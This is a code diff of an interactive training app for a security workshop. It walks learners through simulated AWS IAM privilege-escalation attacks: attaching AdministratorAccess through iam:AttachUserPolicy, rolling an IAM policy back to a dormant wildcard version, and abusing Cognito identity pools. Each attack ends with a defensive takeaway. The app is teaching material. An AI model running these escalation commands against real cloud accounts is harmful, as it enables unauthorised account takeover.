+const ACC={'1':{d:'none',l:'No Access',b:''},'2':{d:'none',l:'No Access',b:''},'3':{d:'none',l:'No Access',b:''},'4.1':{d:'none',l:'Setting Up',b:''},'4.2':{d:'auth',l:'Authenticated',b:'IAM user created'},'4.3':{d:'auth',l:'Authenticated',b:'CLI configured'},'5.1':{d:'auth',l:'Authenticated',b:''},'5.2':{d:'auth',l:'Authenticated',b:''},'5.3':{d:'auth',l:'Authenticated',b:''},'6':{d:'limited',l:'Read-Only IAM',b:'iam:Get*, iam:List*'},'7.0':{d:'limited',l:'Read-Only IAM',b:'Understanding IAM'},'7.0b':{d:'limited',l:'Read-Only IAM',b:'Policy evaluation'},'7.1':{d:'limited',l:'Read-Only IAM',b:'Reviewing misconfiguration patterns'},'7.1a':{d:'limited',l:'dev-user',b:'iam:AttachUserPolicy on *'},'7.1b':{d:'admin',l:'FULL ADMIN',b:'AttachUserPolicy → AdministratorAccess'},'7.2':{d:'limited',l:'Limited IAM',b:'iam:SetDefaultPolicyVersion'},'7.3':{d:'admin',l:'FULL ADMIN',b:'Rolled back to v1: Action *'},'7.4a':{d:'admin',l:'Admin',b:'Cognito Identity Pool'},'7.4':{d:'admin',l:'Admin + Cognito',b:'Unauth creds obtained'},'8.0':{d:'admin',l:'Admin + Creds',b:'Multiple paths'},'8.1':{d:'admin',l:'Admin + EC2 + S3',b:'Stolen EC2 role creds'},'9.0':{d:'admin',l:'Admin + EC2 + S3',b:''},'9.1':{d:'admin',l:'TOTAL TAKEOVER',b:'AdministratorAccess attached'},'10.0':{d:'clean',l:'Cleaning Up',b:''},'11':{d:'clean',l:'Neutralized',b:'All destroyed'}};
+
+// ═══ Policy version data for wrong-choice branching ═══
+const VPOLICIES={
+  v5:{name:'v5 — Current Default',actions:['iam:Get*','iam:List*','iam:SetDefaultPolicyVersion'],desc:'Read-only IAM with the ability to switch policy versions. This is your current access.'},
+  v4:{name:'v4 — EC2 Describe',actions:['ec2:Describe*'],desc:'EC2 read-only. Lets you see instances but has zero IAM capability.'},
+  v3:{name:'v3 — S3 Read',actions:['s3:GetObject','s3:ListBucket'],desc:'S3 read-only. Useful for data access but cannot escalate identity.'},
+  v2:{name:'v2 — CloudWatch',actions:['cloudwatch:Get*','cloudwatch:List*','logs:Get*'],desc:'Monitoring only. Read logs but no IAM privilege whatsoever.'},
+  v1:{name:'v1 — Full Admin',actions:['*'],desc:'Unrestricted. Action: *, Resource: *. Full AdministratorAccess.'}
 };
 
-const VPOL={v5:{a:['iam:Get*','iam:List*','iam:SetDefaultPolicyVersion'],d:'Current default. Read-only IAM + version switching.'},v4:{a:['ec2:Describe*'],d:'EC2 read-only. Zero IAM capability.'},v3:{a:['s3:GetObject','s3:ListBucket'],d:'S3 read-only. No IAM privilege.'},v2:{a:['cloudwatch:Get*','logs:Get*'],d:'Monitoring only. No IAM access.'},v1:{a:['*'],d:'Action: *, Resource: *. Full admin.'}};
-
-let S={scr:null,anims:[],a1s:0,a2s:0};
+let S={scr:null,anims:[],cliStep:0,reconStep:0,ssrfStep:0,lamRole:null};
 const $=id=>document.getElementById(id);
 const $$=(s,p)=>(p||document).querySelectorAll(s);
 const dly=ms=>new Promise(r=>{const id=setTimeout(r,ms);S.anims.push(id)});
 const clr=()=>{S.anims.forEach(id=>clearTimeout(id));S.anims=[]};
 const sj=o=>JSON.stringify(o,null,2).split('\n').map(l=>{let s=l.replace(/ /g,'&nbsp;');s=s.replace(/"([^"]+)":/g,'<span class="jk">"$1"</span>:');s=s.replace(/: "([^"]+)"/g,': <span class="js">"$1"</span>');s=s.replace(/: (\d+)/g,': <span class="jn">$1</span>');s=s.replace(/: (true|false|null)/g,': <span class="jb">$1</span>');return s}).join('<br>');
-function aL(tid,t,c){const b=$(tid);if(!b)return;const d=document.createElement('div');d.className=`tl ${c||'out'}`;d.innerHTML=t;b.appendChild(d);b.scrollTop=b.scrollHeight}
-async function tL(tid,t,c,sp){sp=sp||12;const b=$(tid);const d=document.createElement('div');d.className=`tl ${c||'out'}`;b.appendChild(d);for(let i=0;i<t.length;i++){d.innerHTML=t.substring(0,i+1);b.scrollTop=b.scrollHeight;await dly(sp)}}
+function aL(tid,t,c){const b=$(tid);if(!b)return;const d=document.createElement('div');d.className=`tl ${c||'out'}`;d.innerHTML=t;b.appendChild(d);b.scrollTop=b.scrollHeight;return d}
+async function tL(tid,t,c,sp){sp=sp||12;const b=$(tid);const d=document.createElement('div');d.className=`tl ${c||'out'}`;b.appendChild(d);for(let i=0;i<t.length;i++){d.innerHTML=t.substring(0,i+1);b.scrollTop=b.scrollHeight;await dly(sp)}return d}
 function aP(tid,ps,ph,cb,hint){const b=$(tid);const r=document.createElement('div');r.className='tp';r.innerHTML=`<span class="ps">${ps}</span>`;const inp=document.createElement('input');inp.className='tpi';inp.placeholder=ph||'';inp.autocomplete='off';inp.spellcheck=false;r.appendChild(inp);b.appendChild(r);b.scrollTop=b.scrollHeight;inp.focus();inp.addEventListener('keydown',function h(e){if(e.key==='Enter'){e.preventDefault();const v=inp.value.trim()||hint||'';inp.value=v;inp.disabled=true;inp.removeEventListener('keydown',h);if(cb)cb(v)}});return inp}
 function toast(m,t){const e=document.createElement('div');e.className=`toast ${t||'info'}`;e.textContent=m;$('tc').appendChild(e);setTimeout(()=>e.remove(),4000)}
-function showW(id){const el=$(id);if(el)el.classList.add('vis')}
+function modal(t,b,f){$('mod').innerHTML=`<div class="mod-h"><h2>${t}</h2><button class="mod-x" onclick="cModal()">✕</button></div><div class="mod-b">${b}</div>${f?`<div class="mod-f">${f}</div>`:''}`;$('mov').classList.add('vis')}
+function cModal(){$('mov').classList.remove('vis')}
+function showWhy(id){const el=$(id);if(el)el.classList.add('vis')}
 
 function buildSB(){
-  let h=`<div class="sb-brand"><div class="sb-brand-icon">HB</div><div class="sb-brand-text">Hack The Bay 3.0<span>AWS IAM Attacks · 20 min</span></div></div>`;
-  h+=`<div class="sb-access"><div class="sb-access-label">Attacker Access Level</div><div class="sb-access-level"><span class="adot none" id="adot"></span><span id="alvl">No Access</span></div><div class="sb-access-body" id="abdy"></div></div>`;
+  let h=`<div class="sb-brand"><div class="sb-brand-icon">HB</div><div class="sb-brand-text">Hack The Bay 3.0<span>AWS Attack Workshop</span></div></div>`;
+  h+=`<div class="sb-access"><div class="sb-access-label">Access Level</div><div class="sb-access-level"><span class="adot none" id="adot"></span><span id="alvl">No Access</span></div><div class="sb-access-body" id="abdy"></div></div>`;
   h+=`<div class="sb-nav">`;
-  NAV.forEach(s=>{const has=s.ch&&s.ch.length;h+=`<div><div class="sb-hdr" data-sid="${s.id}" onclick="${has?`tgl('${s.id}')`:`nav('${s.id}')`}">`;if(s.n)h+=`<span class="num">${s.n}</span>`;h+=`<span>${s.label}</span>`;if(has)h+=`<span class="chv">▸</span>`;h+=`</div>`;if(has){h+=`<div class="sb-ch" data-sch="${s.id}">`;s.ch.forEach(c=>{h+=`<div class="sb-child" data-sid="${c.id}" onclick="nav('${c.id}')">${c.label}</div>`});h+=`</div>`}h+=`</div>`});
+  NAV.forEach(s=>{const has=s.ch&&s.ch.length;h+=`<div class="sb-sec"><div class="sb-hdr" data-sid="${s.id}" onclick="${has?`tglSec('${s.id}')`:`nav('${s.id}')`}">`;if(s.n)h+=`<span class="num">${s.n}</span>`;h+=`<span>${s.label}</span>`;if(has)h+=`<span class="chv">▸</span>`;h+=`</div>`;if(has){h+=`<div class="sb-ch" data-sch="${s.id}">`;s.ch.forEach(c=>{h+=`<div class="sb-child" data-sid="${c.id}" onclick="nav('${c.id}')">${c.label}</div>`});h+=`</div>`}h+=`</div>`});
   h+=`</div>`;$('sidebar').innerHTML=h;
 }
-function tgl(id){const ch=document.querySelector(`[data-sch="${id}"]`);const hdr=document.querySelector(`.sb-hdr[data-sid="${id}"]`);if(ch){ch.classList.toggle('open');hdr.classList.toggle('open')}const sec=NAV.find(s=>s.id===id);if(sec&&sec.ch)nav(sec.ch[0].id)}
-function updSB(sid){$$('.sb-hdr').forEach(h=>h.classList.remove('active'));$$('.sb-child').forEach(c=>c.classList.remove('active'));const el=document.querySelector(`.sb-child[data-sid="${sid}"]`)||document.querySelector(`.sb-hdr[data-sid="${sid}"]`);if(el)el.classList.add('active');const pid=PAR[sid];if(pid){const hdr=document.querySelector(`.sb-hdr[data-sid="${pid}"]`);if(hdr){hdr.classList.add('active');hdr.classList.add('open')}const ch=document.querySelector(`[data-sch="${pid}"]`);if(ch)ch.classList.add('open')}const a=ACC[sid]||ACC['title'];$('adot').className=`adot ${a.d}`;$('alvl').textContent=a.l;$('abdy').textContent=a.b}
-function nav(id){if(id===S.scr)return;clr();if(S.scr){const o=document.querySelector(`#main .scr[data-id="${S.scr}"]`);if(o)o.classList.remove('active')}const n=document.querySelector(`#main .scr[data-id="${id}"]`);if(!n)return;n.classList.add('active');S.scr=id;updSB(id);$('topbar-fill').style.width=((FLAT.indexOf(id)+1)/FLAT.length*100)+'%';init(id)}
-document.addEventListener('keydown',e=>{if(e.target.tagName==='INPUT')return;const i=FLAT.indexOf(S.scr);if(e.key==='ArrowRight'&&i<FLAT.length-1)nav(FLAT[i+1]);else if(e.key==='ArrowLeft'&&i>0)nav(FLAT[i-1])});
+function tglSec(id){const ch=document.querySelector(`[data-sch="${id}"]`);const hdr=document.querySelector(`.sb-hdr[data-sid="${id}"]`);if(ch){ch.classList.toggle('open');hdr.classList.toggle('open')}const sec=NAV.find(s=>s.id===id);if(sec&&sec.ch)nav(sec.ch[0].id)}
+function updSB(sid){$$('.sb-hdr').forEach(h=>h.classList.remove('active'));$$('.sb-child').forEach(c=>c.classList.remove('active'));const el=document.querySelector(`.sb-child[data-sid="${sid}"]`)||document.querySelector(`.sb-hdr[data-sid="${sid}"]`);if(el)el.classList.add('active');const pid=PAR[sid];if(pid){const hdr=document.querySelector(`.sb-hdr[data-sid="${pid}"]`);if(hdr){hdr.classList.add('active');hdr.classList.add('open')}const ch=document.querySelector(`[data-sch="${pid}"]`);if(ch)ch.classList.add('open')}const a=ACC[sid]||ACC['1'];$('adot').className=`adot ${a.d}`;$('alvl').textContent=a.l;$('abdy').textContent=a.b}
 
-// ═══ ALL SCREENS ═══
-function buildScreens(){$('main').innerHTML=`
+function nav(id){if(id===S.scr)return;clr();const oid=S.scr;if(oid){const o=document.querySelector(`#main .scr[data-id="${oid}"]`);if(o)o.classList.remove('active')}const n=document.querySelector(`#main .scr[data-id="${id}"]`);if(!n)return;n.classList.add('active');S.scr=id;updSB(id);const idx=FLAT.indexOf(id);$('topbar-fill').style.width=((idx+1)/FLAT.length*100)+'%';initScr(id)}
+document.addEventListener('keydown',e=>{if(e.target.tagName==='INPUT'||e.target.tagName==='SELECT')return;const i=FLAT.indexOf(S.scr);if(e.key==='ArrowRight'&&i<FLAT.length-1)nav(FLAT[i+1]);else if(e.key==='ArrowLeft'&&i>0)nav(FLAT[i-1])});
+function cntUp(scope){$$(scope+' .mv[data-count]').forEach(el=>{const tgt=+el.dataset.count,st=performance.now();(function tk(now){const p=Math.min((now-st)/1200,1);el.textContent=Math.round(tgt*(1-Math.pow(1-p,3)));if(p<1)requestAnimationFrame(tk)})(st)})}
 
-<!-- INTRO: TITLE -->
-<div class="scr" data-id="title">
-<div class="tc" style="margin-top:60px">
-<div class="badge" style="justify-content:center">Hack The Bay 3.0</div>
-<h1 class="ptitle" style="font-size:52px">AWS IAM Attacks</h1>
-<p class="psub" style="margin:12px auto 40px;max-width:600px;text-align:center">3 attacks. 20 minutes. No zero-days required — just misconfigured identity.</p>
-<div style="display:flex;gap:16px;justify-content:center;margin-bottom:40px">
-<div class="card tc" style="min-width:180px"><div style="font-size:28px;font-weight:800;color:var(--b)">Attack 1</div><div style="font-size:13px;color:var(--tm)">IAM Privilege Escalation</div></div>
-<div class="card tc" style="min-width:180px"><div style="font-size:28px;font-weight:800;color:var(--a)">Attack 2</div><div style="font-size:13px;color:var(--tm)">Policy Version Rollback</div></div>
-<div class="card tc" style="min-width:180px"><div style="font-size:28px;font-weight:800;color:var(--o)">Attack 3</div><div style="font-size:13px;color:var(--tm)">Cognito Identity Pool Abuse</div></div>
-</div>
-<button class="btn btn1 pulse" onclick="nav('perimeter')">Start →</button>
-</div></div>
+// I'm going to split the SCREEN_HTML generation to keep things manageable
+// Each screen is generated via a function that returns HTML
+function buildScreens(){$('main').innerHTML=genAllScreens()}
 
-<!-- INTRO: PERIMETER IS IDENTITY -->
-<div class="scr" data-id="perimeter">
-<div class="badge">0:15 — The Thesis</div>
-<h1 class="ptitle">In Cloud, the Perimeter is Identity</h1>
-<p class="psub">Most real AWS compromises don't look like breaking through a firewall. They look like someone using perfectly valid API calls — doing exactly what AWS was configured to allow.</p>
-<div class="quote">"A cloud IAM attack is not breaking a window. It's finding out your badge already opens more doors than anyone realized — or that it lets you print a better badge."</div>
-<div class="callout danger"><strong>The environment isn't broken.</strong> The security design is. That's a fundamentally different kind of attack. No exploit. No CVE. Just the system doing what it was told.</div>
-<div class="mt-24"><button class="btn btn1" onclick="nav('pillars')">5 Pillars →</button></div>
-</div>
-
-<!-- INTRO: 5 PILLARS -->
-<div class="scr" data-id="pillars">
-<div class="badge">1:15 — The Frame</div>
-<h1 class="ptitle">5 Ideas Behind Every Attack</h1>
-<p class="psub">Keep these in mind. You'll see each one play out.</p>
-<div style="max-width:700px">
-<div class="pillar"><span class="pnum">1</span><strong>IAM is the real control plane.</strong> <span style="color:var(--t2)">Every API call goes through it.</span></div>
-<div class="pillar"><span class="pnum">2</span><strong>Misconfiguration is enough.</strong> <span style="color:var(--t2)">No zero-day required.</span></div>
-<div class="pillar"><span class="pnum">3</span><strong>Identity mobility.</strong> <span style="color:var(--t2)">Attackers ask "what can I become" — not just "what can I do."</span></div>
-<div class="pillar"><span class="pnum">4</span><strong>Meta-permissions are privilege multipliers.</strong> <span style="color:var(--t2)">Permissions that edit policies or change trust relationships.</span></div>
-<div class="pillar"><span class="pnum">5</span><strong>Cloud attacks are graph traversals.</strong> <span style="color:var(--t2)">You move across identities and services, not machines.</span></div>
-</div>
-<div class="mt-24"><button class="btn btn1" onclick="nav('a1-scenario')">Attack 1: IAM Priv Esc →</button></div>
-</div>
-
-<!-- ATTACK 1: SCENARIO -->
-<div class="scr" data-id="a1-scenario">
-<div class="badge">Attack 1 — IAM Privilege Escalation</div>
-<h1 class="ptitle">The Scenario</h1>
-<p class="psub">A developer with limited permissions has one permission they shouldn't — and it changes everything.</p>
-<div class="cpan"><div class="cp knows"><div class="cp-label">dev-user has</div><ul><li>Manage one application (S3 read/write to one bucket)</li><li>List and view IAM policies</li><li><strong style="color:var(--r)">iam:AttachUserPolicy on Resource: *</strong></li></ul></div><div class="cp wants"><div class="cp-label">dev-user should not have</div><ul><li>The ability to attach any policy to any user</li><li>Access to AdministratorAccess</li><li>Any path to admin</li></ul></div></div>
-<div class="callout danger"><strong>Meta-permission:</strong> <code>iam:AttachUserPolicy</code> doesn't let you read S3 or delete databases. It lets you reshape who can do what. You're not using the system — you're rewriting the rules of the system.</div>
-<div class="mt-24"><button class="btn btn1" onclick="nav('a1-discover')">Step 1: Who Am I? →</button></div>
-</div>
-
-<!-- ATTACK 1: DISCOVERY (interactive) -->
-<div class="scr" data-id="a1-discover">
-<div class="badge">Attack 1 — Discovery</div>
-<h1 class="ptitle">Enumerate → Discover the Edge</h1>
-<p class="psub">First: identify yourself. Then: read your own policy. Find the meta-permission.</p>
-<div class="split swr"><div>
-<h3 style="margin-bottom:10px">Findings</h3>
-<div id="a1f1" style="padding:12px 16px;border-radius:var(--rads);border-left:3px solid var(--b);margin-bottom:10px;background:var(--bg2);opacity:0;transform:translateY(8px);transition:all .4s"><div style="font-size:13px;font-weight:700">Identity Confirmed</div><div style="font-size:12px;color:var(--tm);font-family:var(--mono)">arn:aws:iam::012345678901:user/dev-user</div></div>
-<div id="a1f2" style="padding:12px 16px;border-radius:var(--rads);border-left:3px solid var(--a);margin-bottom:10px;background:var(--bg2);opacity:0;transform:translateY(8px);transition:all .4s"><div style="font-size:13px;font-weight:700">Policy Reviewed</div><div style="font-size:12px;color:var(--tm);font-family:var(--mono)">dev-app-policy: s3 access + iam:AttachUserPolicy</div></div>
-<div id="a1f3" style="padding:12px 16px;border-radius:var(--rads);border-left:3px solid var(--r);margin-bottom:10px;background:var(--bg2);opacity:0;transform:translateY(8px);transition:all .4s"><div style="font-size:13px;font-weight:700;color:var(--r)">Meta-Permission Found</div><div style="font-size:12px;color:var(--tm);font-family:var(--mono)">iam:AttachUserPolicy on Resource: * — can attach ANY policy to ANY user</div></div>
-<button class="btn btn1 mt-20" id="a1-next" onclick="nav('a1-exploit')" disabled>Step 3: Escalate →</button>
-</div><div>
-<div class="term focus"><div class="th"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tt">dev-user@aws</span></div><div class="tb2" id="t-a1d"></div>
-<div class="thint" id="a1h"><span class="hk">↵</span> submit <span style="margin-left:auto">Next: <span class="hc" id="a1hc" onclick="a1Hint()"></span></span></div></div>
-</div></div></div>
-
-<!-- ATTACK 1: ESCALATION (interactive) -->
-<div class="scr" data-id="a1-exploit">
-<div class="badge">Attack 1 — Escalation</div>
-<h1 class="ptitle">One Command. Full Admin.</h1>
-<p class="psub">Attach AdministratorAccess to yourself. AWS will do exactly what you ask.</p>
-<div id="a1-fb" class="fb dng mb-20">⚠ dev-user is now FULL ADMIN — one API call</div>
-<div class="split"><div>
-<div class="card"><h4>The Command</h4><div style="font-family:var(--mono);font-size:13px;color:var(--cy);margin-top:10px;line-height:1.8">aws iam attach-user-policy \<br>&nbsp;&nbsp;--user-name dev-user \<br>&nbsp;&nbsp;--policy-arn arn:aws:iam::aws:policy/AdministratorAccess</div></div>
-<div class="callout danger mt-16"><strong>No exploit. No vulnerability. No CVE.</strong> AWS did exactly what it was told. The policy said this user can attach any policy to any user. The user attached the most powerful policy to themselves.</div>
-<div class="why-box vis mt-16"><strong>This is what "design-valid attack" means.</strong> AWS is operating correctly. The security design is not.</div>
-</div><div>
-<div class="term focus"><div class="th"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tt">escalation</span></div><div class="tb2" id="t-a1e"></div>
-<div class="thint"><span class="hk">↵</span> submit <span style="margin-left:auto"><span class="hc" onclick="runA1Esc()">Run escalation command</span></span></div></div>
-</div></div>
-<div class="mt-24"><button class="btn btn1" id="a1e-next" onclick="nav('a1-graph')" disabled>The Graph View →</button></div>
-</div>
-
-<!-- ATTACK 1: GRAPH VIEW -->
-<div class="scr" data-id="a1-graph">
-<div class="badge">Attack 1 — The Graph View</div>
-<h1 class="ptitle">One Edge. Full Compromise.</h1>
-<p class="psub">If you think about IAM as a graph — and you should — this user had an edge they shouldn't have had.</p>
-<div class="arch mb-24" style="gap:16px;padding:36px">
-<div class="an"><div class="ai aws-iam">${ISVG}</div><div class="an-l">dev-user</div><div class="an-s">Limited</div></div>
-<div class="aarr atk">→ AttachUserPolicy</div>
-<div class="an vuln"><div class="ai aws-iam" style="color:var(--r)"><svg viewBox="0 0 40 40"><path d="M20 4L6 12v16l14 8 14-8V12L20 4z" fill="none" stroke="currentColor" stroke-width="2"/><text x="20" y="24" text-anchor="middle" font-size="10" font-weight="800" fill="currentColor">ADM</text></svg></div><div class="an-l" style="color:var(--r)">AdministratorAccess</div><div class="an-s" style="color:var(--r)">Action: * Resource: *</div></div>
-<div class="aarr">→</div>
-<div class="an"><div class="an-l">Full Account</div><div class="an-s">All services, all data</div></div>
-</div>
-<div class="quote">"They didn't have admin. They had something more dangerous: the ability to give themselves admin."</div>
-<div class="card"><h4>Why This Happens in Real Orgs</h4><div style="font-size:14px;color:var(--t2);margin-top:8px;line-height:1.7">• <strong>Speed over precision</strong> — deployment was blocked, someone granted broad IAM to unblock it<br>• <strong>Incomplete least privilege</strong> — plan was to tighten later. Later never came<br>• <strong>Resource: * as default</strong> — scoping to specific ARNs is hard with dynamic resource names<br>• <strong>Fear of breaking prod</strong> — nobody wants to cause an outage because a role was too narrow<br><br>The gap between "what permissions exist" and "what permissions are used" is your attack surface.</div></div>
-<div class="mt-24"><button class="btn btn1" onclick="nav('a1-takeaway')">Takeaway →</button></div>
-</div>
-
-<!-- ATTACK 1: TAKEAWAY -->
-<div class="scr" data-id="a1-takeaway">
-<div class="badge">Attack 1 — Takeaway</div>
-<h1 class="ptitle">Audit Who Has Write Access to IAM</h1>
-<p class="psub">Permissions are not just about what you can DO. They're about what you can BECOME.</p>
-<div class="card mb-24"><h4>Key Lesson</h4><p style="font-size:15px;color:var(--t2);margin-top:8px;line-height:1.7">Any time a principal can modify policies, trust relationships, or credential state, you have a potential escalation path. Meta-permissions — <code>AttachUserPolicy</code>, <code>PutUserPolicy</code>, <code>CreatePolicyVersion</code>, <code>PassRole</code> — are privilege multipliers.</p></div>
-<div class="callout insight"><strong>Transition:</strong> That attack required the user to have an IAM write permission they shouldn't have. But what if the permissions look clean today… and the vulnerability is hiding in the past?</div>
-<div class="mt-24"><button class="btn btn1" onclick="nav('a2-scenario')">Attack 2: Policy Rollback →</button></div>
-</div>
-
-<!-- ATTACK 2: SCENARIO -->
-<div class="scr" data-id="a2-scenario">
-<div class="badge">Attack 2 — Policy Version Rollback</div>
-<h1 class="ptitle">The Hidden Past</h1>
-<p class="psub">Current permissions look safe. But AWS keeps up to 5 policy versions. The vulnerability is dormant in history.</p>
-<div class="cpan"><div class="cp knows"><div class="cp-label">raynor has</div><ul><li>Current policy (v5): read-only IAM + CloudWatch</li><li>Nothing scary in current permissions</li><li>But: <code>iam:SetDefaultPolicyVersion</code></li></ul></div><div class="cp wants"><div class="cp-label">Defenders don't realize</div><ul><li>Version 1 still exists — <code>Action: *, Resource: *</code></li><li>It was the dev version, tightened in v2-v5</li><li>But v1 was never deleted</li></ul></div></div>
-<div class="mt-24"><button class="btn btn1" onclick="nav('a2-versioning')">How Versioning Works →</button></div>
-</div>
-
-<!-- ATTACK 2: VERSIONING -->
-<div class="scr" data-id="a2-versioning">
-<div class="badge">Attack 2 — Background</div>
-<h1 class="ptitle">How Policy Versioning Works</h1>
-<p class="psub">Every edit creates a new version. Old versions sit dormant. But they're not deleted.</p>
-<div class="card mb-24"><div style="font-size:14px;color:var(--t2);line-height:1.8"><strong>Version 1</strong> → created during development (<code>Action: *</code>)<br><strong>Version 2</strong> → tightened for staging<br><strong>Version 3</strong> → tightened for prod<br><strong>Version 4</strong> → further restricted<br><strong>Version 5</strong> → current default (read-only)<br><br>Versions 1–4 are <strong>dormant but not deleted</strong>. Two IAM actions interact with this:</div>
-<div class="mt-12" style="font-size:14px;color:var(--t2)"><code>iam:CreatePolicyVersion</code> — create new version + set as default<br><code>iam:SetDefaultPolicyVersion</code> — switch which version is active</div></div>
-<div class="callout danger"><strong>If a user has <code>SetDefaultPolicyVersion</code> on a policy attached to them</strong> — they can roll back to any previous version. Including the wide-open v1.</div>
-<div class="mt-24"><button class="btn btn1" onclick="nav('a2-discover')">Attacker Discovery →</button></div>
-</div>
-
-<!-- ATTACK 2: DISCOVERY (interactive) -->
-<div class="scr" data-id="a2-discover">
-<div class="badge">Attack 2 — Discovery</div>
-<h1 class="ptitle">Enumerate Policy Versions</h1>
-<p class="psub">Find the attached policy. List all versions. Read the old ones.</p>
-<div class="split swr"><div>
-<h3 style="margin-bottom:10px">Findings</h3>
-<div id="a2f1" style="padding:12px 16px;border-radius:var(--rads);border-left:3px solid var(--b);margin-bottom:10px;background:var(--bg2);opacity:0;transform:translateY(8px);transition:all .4s"><div style="font-size:13px;font-weight:700">User: raynor</div><div style="font-size:12px;color:var(--tm);font-family:var(--mono)">cg-raynor-policy attached</div></div>
-<div id="a2f2" style="padding:12px 16px;border-radius:var(--rads);border-left:3px solid var(--a);margin-bottom:10px;background:var(--bg2);opacity:0;transform:translateY(8px);transition:all .4s"><div style="font-size:13px;font-weight:700">5 Versions Found</div><div style="font-size:12px;color:var(--tm);font-family:var(--mono)">v1, v2, v3, v4, v5 (default)</div></div>
-<div id="a2f3" style="padding:12px 16px;border-radius:var(--rads);border-left:3px solid var(--r);margin-bottom:10px;background:var(--bg2);opacity:0;transform:translateY(8px);transition:all .4s"><div style="font-size:13px;font-weight:700;color:var(--r)">v1 = Action: *, Resource: *</div><div style="font-size:12px;color:var(--tm);font-family:var(--mono)">Development version. Never deleted.</div></div>
-<button class="btn btn1 mt-20" id="a2-next" onclick="nav('a2-exploit')" disabled>The Rollback →</button>
-</div><div>
-<div class="term focus"><div class="th"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tt">raynor@aws</span></div><div class="tb2" id="t-a2d"></div>
-<div class="thint" id="a2h"><span class="hk">↵</span> submit <span style="margin-left:auto">Next: <span class="hc" id="a2hc" onclick="a2Hint()"></span></span></div></div>
-</div></div></div>
-
-<!-- ATTACK 2: ROLLBACK (interactive) -->
-<div class="scr" data-id="a2-exploit">
-<div class="badge">Attack 2 — The Rollback</div>
-<h1 class="ptitle">Rewind Time</h1>
-<p class="psub">Select the target version. The attacker doesn't create anything new — they activate what already existed.</p>
-<div id="a2-fb" class="fb dng mb-20">⚠ PRIVILEGE ESCALATED — Rolled back to v1: Action *, Resource *</div>
-<div class="split mb-20"><div><h4>Current (v5)</h4><div class="pbox mt-8"><div class="phdr safe">v5 · Default</div><div class="pbdy">{<br>&nbsp;&nbsp;<span class="jk">"Action"</span>: [<span class="js">"iam:Get*"</span>, <span class="js">"iam:List*"</span>, <span class="js">"iam:SetDefaultPolicyVersion"</span>],<br>&nbsp;&nbsp;<span class="jk">"Resource"</span>: <span class="js">"*"</span><br>}</div></div></div><div><h4>Target (v1) — <span style="color:var(--r)">Full Admin</span></h4><div class="pbox mt-8"><div class="phdr dng">v1 · Dormant</div><div class="pbdy">{<br>&nbsp;&nbsp;<span class="jk">"Action"</span>: <span class="jd">"*"</span>,<br>&nbsp;&nbsp;<span class="jk">"Resource"</span>: <span class="jd">"*"</span><br>}</div></div></div></div>
-<div class="card mb-20" id="vsel"><h4>Select Target Version</h4><p style="font-size:13px;color:var(--tm);margin-bottom:14px">Each version has different permissions. Only one grants admin.</p><div style="display:grid;grid-template-columns:repeat(5,1fr);gap:10px"><div class="ocard" onclick="pkV(this,'v5')" style="text-align:center;padding:10px"><div class="oct">v5</div><div class="ocd">Default</div></div><div class="ocard" onclick="pkV(this,'v4')" style="text-align:center;padding:10px"><div class="oct">v4</div><div class="ocd">EC2 Read</div></div><div class="ocard" onclick="pkV(this,'v3')" style="text-align:center;padding:10px"><div class="oct">v3</div><div class="ocd">S3 Read</div></div><div class="ocard" onclick="pkV(this,'v2')" style="text-align:center;padding:10px"><div class="oct">v2</div><div class="ocd">CW Logs</div></div><div class="ocard" onclick="pkV(this,'v1')" style="text-align:center;padding:10px;border-color:rgba(255,71,87,.2)"><div class="oct" style="color:var(--r)">v1</div><div class="ocd" style="color:var(--r)">Admin *:*</div></div></div><div class="epan" id="ve"><h4>Wrong Version</h4><p id="vem"></p><div class="fix">Only v1 has <code>"Action": "*"</code>. The rollback succeeds, but the resulting permissions are insufficient.</div></div></div>
-<div class="cbox dng" id="ec"><h4 style="color:var(--r)">⚠ Confirm Rollback</h4><p>Set default to <strong>v1</strong>. Type <code>ESCALATE</code>.</p><div class="crow"><input class="fi" id="ei" placeholder="Type ESCALATE" autocomplete="off"><button class="btn btn1 btns" id="be" onclick="doEsc()" disabled>Execute</button></div></div>
-<div class="term mt-16"><div class="th"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tt">rollback</span></div><div class="tb2" id="t-a2e"></div></div>
-<div class="why-box" id="a2-why"><strong>The attacker didn't create anything new. They rewound time.</strong> They activated permissions that already existed but were dormant. Current config looking safe means nothing if the past is still reachable.</div>
-<div class="mt-24"><button class="btn btn1" id="a2e-next" onclick="nav('a2-takeaway')" disabled>Takeaway →</button></div>
-</div>
-
-<!-- ATTACK 2: TAKEAWAY -->
-<div class="scr" data-id="a2-takeaway">
-<div class="badge">Attack 2 — Takeaway</div>
-<h1 class="ptitle">Delete Old Versions. Audit Meta-Permissions.</h1>
-<p class="psub">Hidden permission state is the attack surface. Not what's active — what's dormant.</p>
-<div class="cg cg2 mb-24">
-<div class="card"><h4>Lesson 1</h4><p style="font-size:14px;color:var(--t2);margin-top:8px">Always delete old policy versions after tightening. If you have 5 versions and only the latest is restrictive, you have <strong>4 dormant escalation paths</strong>.</p></div>
-<div class="card"><h4>Lesson 2</h4><p style="font-size:14px;color:var(--t2);margin-top:8px">Audit <code>SetDefaultPolicyVersion</code> and <code>CreatePolicyVersion</code> like admin access. These are meta-permissions that let someone <strong>rewrite history</strong>.</p></div>
-</div>
-<div class="callout insight"><strong>Transition:</strong> Both attacks so far have been about IAM users and policies within an account. But what about application users? What about the identity layer your app hands out to end users? That's where Cognito comes in.</div>
-<div class="mt-24"><button class="btn btn1" onclick="nav('a3-what')">Attack 3: Cognito →</button></div>
-</div>
-
-<!-- ATTACK 3: WHAT IS COGNITO -->
-<div class="scr" data-id="a3-what">
-<div class="badge">Attack 3 — Cognito Identity Pool Abuse</div>
-<h1 class="ptitle">What is Cognito?</h1>
-<p class="psub">AWS's service for managing application user identities. Two parts — and the second one is dangerous.</p>
-<div class="cg cg2 mb-24">
-<div class="card" style="border-top:3px solid var(--b)"><h4>User Pools</h4><p style="font-size:14px;color:var(--t2);margin-top:8px">Authentication. Usernames, passwords, MFA, sign-up. Think of it as a user database for your app.</p></div>
-<div class="card" style="border-top:3px solid var(--r)"><h4>Identity Pools</h4><p style="font-size:14px;color:var(--t2);margin-top:8px">Take an authenticated user — or an <strong>unauthenticated one</strong> — and hand them <strong>real AWS credentials</strong>. Temporary IAM credentials tied to an IAM role.</p></div>
-</div>
